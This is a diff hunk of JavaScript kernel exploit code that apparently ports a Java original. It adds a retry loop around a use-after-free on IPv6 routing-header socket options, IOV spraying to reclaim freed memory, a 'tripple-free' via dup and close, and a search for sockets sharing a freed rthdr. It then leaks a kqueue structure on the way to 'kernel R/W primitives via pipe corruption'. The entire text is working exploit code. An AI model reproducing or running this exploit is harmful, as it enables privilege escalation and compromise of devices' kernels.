-// Find triplet[1] - a third socket sharing the same rthdr
-log('Finding triplet[1]...')
-triplets[1] = findTriplet(triplets[0], -1)
-if (triplets[1] === -1) {
-  throw new Error('Failed to find triplet[1]')
-}
-log('Found triplet[1]: socket[' + triplets[1] + ']')
+  if (!found_twins) {
+    log('no twins, cleaning up for retry...')
 
-// Release one IOV spray (matching Java line 487-494)
-log('Releasing one IOV spray before finding triplet[2]...')
-doIOVSpray()
+    try {
+      // close uaf socket
+      if (typeof uaf_sock !== 'undefined' && uaf_sock >= 0) {
+        try { close_sys(uaf_sock) } catch(e) {}
+        uaf_sock = -1
+      }
 
-// Find triplet[2] - a fourth socket sharing the same rthdr
-log('Finding triplet[2]...')
-triplets[2] = findTriplet(triplets[0], triplets[1])
-if (triplets[2] === -1) {
-  throw new Error('Failed to find triplet[2]')
-}
-log('Found triplet[2]: socket[' + triplets[2] + ']')
-log('Triplets: [' + triplets[0] + ', ' + triplets[1] + ', ' + triplets[2] + ']')
+      if (typeof dup_fd_num !== 'undefined' && dup_fd_num >= 0) {
+        try { close_sys(dup_fd_num) } catch(e) {}
+      }
 
-// ============================================================================
-// Stage 4: Leak kqueue structure
-// ============================================================================
+      // close all ipv6 sockets (worker threads stay alive)
+      for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+        try {
+          if (typeof ipv6_sockets[i] !== 'undefined' && ipv6_sockets[i] >= 0) {
+            close_sys(ipv6_sockets[i])
+          }
+        } catch (e) {}
+      }
 
-// Free one rthdr to make room for kqueue (use triplets not twins)
-setsockopt(ipv6_sockets[triplets[1]], IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
-log('Freed rthdr on socket[' + triplets[1] + ']')
+      sched_yield()
+
+      // recreate fresh sockets
+      for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+        try {
+          var fd = socket(AF_INET6, SOCK_STREAM, 0)
+          ipv6_sockets[i] = (fd instanceof BigInt) ? fd.lo : fd
+        } catch (e) {
+          log('error creating socket ' + i)
+        }
+      }
+
+      // reinit pktopts
+      for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+        try {
+          if (typeof ipv6_sockets[i] !== 'undefined' && ipv6_sockets[i] >= 0) {
+            setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
+          }
+        } catch (e) {}
+      }
+
+      // let kernel cleanup
+      var cleanup_start = Date.now()
+      while (Date.now() - cleanup_start < 500) {}
+
+      log('retrying exploit...')
+    } catch (e) {
+      log('cleanup error: ' + e.message)
+    }
+
+    // loop continues to retry
+  } else {
+    // twins found! continue with tripple-free inside the loop
+    log('twin sockets: [' + twins[0] + ', ' + twins[1] + ']')
+
+    // free one twin's rthdr
+    setsockopt(ipv6_sockets[twins[1]], IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
+
+    // spray IOV until reclaim (first_int == 1)
+    log('iov reclaim...')
+    var uaf_timeout = UAF_TRIES
+    var reclaim_found = false
+
+    try {
+      while (uaf_timeout-- > 0) {
+        var current_attempt = UAF_TRIES - uaf_timeout
+
+        // log progress every 5000 iterations
+        if (current_attempt % 5000 === 0 && current_attempt > 0) {
+          log('  iov reclaim attempt ' + current_attempt + ' / ' + UAF_TRIES)
+        }
+
+        // signal worker 0
+        write_sys(new BigInt(workers[0].ctrl_sock1), workers[0].signal_buf, new BigInt(0, 1))
+        sched_yield()
+
+        // check if reclaimed
+        mem.view(leak_len_buf).setUint32(0, 8, true)
+        getsockopt(ipv6_sockets[twins[0]], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)
+
+        if (mem.view(leak_rthdr_buf).getUint32(0, true) === 1) {
+          log('iov reclaim success after ' + current_attempt + ' tries')
+          reclaim_found = true
+          break
+        }
+
+        // complete the spray cycle
+        write_sys(new BigInt(iov_ss1), workers[0].signal_buf, new BigInt(0, 1))
+        read_sys(new BigInt(workers[0].ctrl_sock0), workers[0].signal_buf, new BigInt(0, 1))
+        read_sys(new BigInt(iov_ss0), workers[0].signal_buf, new BigInt(0, 1))
+      }
+    } catch (e) {
+      log('iov reclaim crashed at attempt ' + (UAF_TRIES - uaf_timeout) + ': ' + e.message)
+      reclaim_found = false
+    }
+
+    if (!reclaim_found) {
+      log('iov reclaim failed, restarting exploit...')
+      // trigger cleanup and restart by setting found_twins to false
+      // this will jump back to the top of the while loop
+      found_twins = false
+    } else {
+      // reclaim succeeded, continue with tripple-free
+      var triplets = [-1, -1, -1]
+      triplets[0] = twins[0]
+
+      // third free
+      var dup_fd2 = dup_sys(uaf_sock)
+      close_sys(dup_fd2)
+      log('tripple-free complete')
+
+      function findTriplet (master, other) {
+        var max_attempts = 50000
+        var attempt = 0
+
+        while (attempt < max_attempts) {
+          // spray all except master/other
+          for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+            if (i === master || i === other) {
+              continue
+            }
+            mem.view(rthdr_buf).setUint32(4, RTHDR_TAG | i, true)
+            setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
+          }
+
+          // check for shared pktopts
+          for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+            if (i === master || i === other) {
+              continue
+            }
+
+            mem.view(leak_len_buf).setUint32(0, UCRED_SIZE, true)
+            getsockopt(ipv6_sockets[master], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)
+
+            var val = mem.view(leak_rthdr_buf).getUint32(4, true)
+            var j = val & 0xFFFF
+
+            if ((val & 0xFFFF0000) === RTHDR_TAG && j !== master && j !== other) {
+              return j
+            }
+          }
+
+          attempt++
+        }
+
+        return -1
+      }
+
+      log('finding triplet[1]...')
+      triplets[1] = findTriplet(triplets[0], -1)
+      if (triplets[1] === -1) {
+        throw new Error('triplet[1] not found')
+      }
+      log('triplet[1]: ' + triplets[1])
+
+      doIOVSpray()
+
+      log('finding triplet[2]...')
+      triplets[2] = findTriplet(triplets[0], triplets[1])
+      if (triplets[2] === -1) {
+        throw new Error('triplet[2] not found')
+      }
+      log('triplets: [' + triplets[0] + ', ' + triplets[1] + ', ' + triplets[2] + ']')
+
+      // kqueue leak stage
+      log('leaking kqueue...')
+      setsockopt(ipv6_sockets[triplets[1]], IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
 
 // Get kqueue syscall (0x16A = 362)
 fn.register(0x16A, 'kqueue_sys', 'bigint')
@@ -820,6 +1222,12 @@ mem.free(leak_len_buf)
 // ============================================================================
 // STAGE 4: Leak kqueue structure
 // ============================================================================
+
+    }  // end of reclaim success else block
+  }  // end of twins found else block
+}  // end of while (!found_twins) loop
+
+// if we get here, exploit will continue with kqueue leak and beyond
 
 // ============================================================================
 // STAGE 5: Kernel R/W primitives via pipe corruption
